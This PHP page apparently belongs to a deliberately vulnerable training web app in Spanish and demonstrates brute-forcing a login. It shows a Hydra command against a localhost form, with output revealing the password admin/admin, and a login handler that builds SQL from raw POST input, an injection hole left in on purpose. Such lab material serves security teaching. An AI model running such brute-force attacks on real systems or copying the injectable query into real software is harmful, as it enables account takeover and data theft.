<?php include("../../header.php"); ?>

<title>Fuerza Bruta</title>

<section id="template">
      <div class="container">
        <div class="row">
          <div class="col-md-12">
            <h3 class="title text-center">Fuerza Bruta</h3>
            <div class="titleHR"><span></span></div>
          </div>
        </div>

        <pre>hydra -l admin -P pass&period;txt 127&period;0&period;0&period;1 http-post-form &quot;&sol;vistas&sol;vulnerabilidades&sol;brokenauthentication&sol;fuerzabruta&period;php&colon;username&equals;&Hat;USER&Hat;&amp;password&equals;&Hat;PASS&Hat;&colon;Datos incorrectos&quot; -v&NewLine;Hydra v9&period;2 &lpar;c&rpar; 2021 by van Hauser&sol;THC &amp; David Maciejak - Please do not use in military or secret service organizations&comma; or for illegal purposes &lpar;this is non-binding&comma; these &ast;&ast;&ast; ignore laws and ethics anyway&rpar;&period;&NewLine;&NewLine;Hydra &lpar;https&colon;&sol;&sol;github&period;com&sol;vanhauser-thc&sol;thc-hydra&rpar; starting at 2021-10-19 22&colon;02&colon;13&NewLine;&lsqb;DATA&rsqb; max 15 tasks per 1 server&comma; overall 15 tasks&comma; 15 login tries &lpar;l&colon;1&sol;p&colon;15&rpar;&comma; ~1 try per task&NewLine;&lsqb;DATA&rsqb; attacking http-post-form&colon;&sol;&sol;127&period;0&period;0&period;1&colon;80&sol;vistas&sol;vulnerabilidades&sol;brokenauthentication&sol;fuerzabruta&period;php&colon;username&equals;&Hat;USER&Hat;&amp;password&equals;&Hat;PASS&Hat;&colon;Datos incorrectos&NewLine;&lsqb;VERBOSE&rsqb; Resolving addresses &period;&period;&period; &lsqb;VERBOSE&rsqb; resolving done&NewLine;&lsqb;STATUS&rsqb; attack finished for 127&period;0&period;0&period;1 &lpar;waiting for children to complete tests&rpar;&NewLine;&lsqb;80&rsqb;&lsqb;http-post-form&rsqb; host&colon; 127&period;0&period;0&period;1   login&colon; admin   password&colon; admin&NewLine;1 of 1 target successfully completed&comma; 1 valid password found&NewLine;Hydra &lpar;https&colon;&sol;&sol;github&period;com&sol;vanhauser-thc&sol;thc-hydra&rpar; finished at 2021-10-19 22&colon;02&colon;14</pre>


<hr>
<h1>Explotacion</h1>


        <div class="login">
            <div class="account-login">
               <h1>Inicio de Sesion</h1>
               <form action="<?php echo $_SERVER["PHP_SELF"]; ?>" class="login-form" method="post">
                  <div class="form-group">
                     <input type="text" placeholder="Usuario" class="form-control" name="username">
                  </div>
                  <div class="form-group">
                     <input type="password" placeholder="Contrasena"  class="form-control" name="password">
                  </div>
                  <input type="submit" class="btn" value="Iniciar Sesion">
               </form>
            </div>
        </div>

<?php
    if (isset($_POST['username']) && isset($_POST['password'])){
      
      require "connection.php";

      $var_consulta= "select * from users where name = '".$_POST["username"]."' and "." password = '".$_POST["password"]."';";
      $var_resultado = $obj_conexion->query($var_consulta);
      
      if($var_resultado->num_rows>0){
        echo "<h3 style=\"color: green\">Inicio de sesion exitoso</h3>";
      }else{
        echo "<h3 style=\"color: red\">Datos incorrectos</h3>";
      }
    }
?>

    </div> <!--/.container -->
    </section>
 
    

<?php include("../../footer.php"); ?>